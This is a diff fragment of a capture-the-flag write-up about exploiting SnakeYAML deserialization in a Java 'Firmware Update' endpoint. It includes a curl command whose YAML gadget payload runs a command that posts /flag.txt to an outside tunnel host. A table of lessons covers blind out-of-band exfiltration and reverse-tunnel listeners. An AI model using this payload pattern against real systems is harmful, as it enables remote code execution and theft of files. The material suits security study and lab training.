@@ -96,7 +96,7 @@ Sent via the Firmware Update page textarea, or equivalently:
 
 ```bash
 curl -X POST http://154.57.164.69:30255/update \
-  --data-urlencode 'config=!!com.lean.watersnake.GetWaterLevel ["curl -d @/flag.txt -X POST https://51986a07ee20bdb0-68-134-210-41.serveousercontent.com"]'
+  --data-urlencode 'config:!!com.lean.watersnake.GetWaterLevel ["curl -d @/flag.txt -X POST https://51986a07ee20bdb0-68-134-210-41.serveousercontent.com"]'
 ```
 
 **Output (netcat terminal):**
@@ -128,7 +128,6 @@ The flag arrived in the POST body as the contents of `/flag.txt`, curled from th
 |---|---|---|
 | Python YAML gadgets (`!!python/object/apply`) | Java backend — Python gadgets don't apply | Always match gadget language to backend runtime |
 | Reading flag via `/stats` after modifying `watersensor` | Command output not returned by YAML deserialization; SnakeYAML throws exception before response | Need out-of-band exfiltration when output is blind |
-| `!!javax.script.ScriptEngineManager` with remote JAR | Target has no outbound internet — JAR couldn't be fetched | Check network constraints before planning remote-resource gadgets |
 | `python3 -m http.server` as POST listener | Returns HTTP 501 on POST requests | Use netcat for raw listener; Python's http.server is GET-only |
 | Hosting exploit infrastructure externally | No VPN tunnel in this challenge — direct attacker IP unreachable | Use serveo.net (SSH reverse tunnel) to proxy through localhost |
 
